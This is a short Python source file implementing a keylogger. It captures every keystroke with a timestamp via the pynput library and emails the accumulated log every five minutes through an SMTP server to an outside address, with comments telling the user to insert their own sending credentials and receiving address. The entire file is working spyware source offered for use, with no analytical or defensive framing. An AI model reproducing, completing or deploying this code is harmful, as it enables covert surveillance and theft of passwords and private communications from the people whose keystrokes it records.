from pynput.keyboard import Key, Listener
import threading
import smtplib
import socket
import datetime

logString = ''

def send_email():

    threading.Timer(300.0, send_email).start()

    try:
        mail = smtplib.SMTP('smtp.gmail.com', 587)
        mail.ehlo()
        mail.starttls()
        
        #enter your sending email address as the first parameter and the corresponding password as the second parameter
        mail.login('email@aol.com', 'password')
        
        #enter your sending email address as the first parameter and your receiving email address as the second parameter
        mail.sendmail('email@aol.com', 'receivingemail@hotmail.com', logString)
        
        mail.close()

    except (socket.error, socket.gaierror, socket.herror, socket.timeout):
        return

def on_press(key):
    global logString
    logString = logString + '\n' + datetime.datetime.now().strftime("%a, %d %B %Y %H:%M:%S") + ' ' + str(key)
   
class GetKeyStrokes (threading.Thread):
    def run(self):
        with Listener(on_press=on_press) as listener:
            listener.join()

mainThread = GetKeyStrokes()

mainThread.start()
send_email()
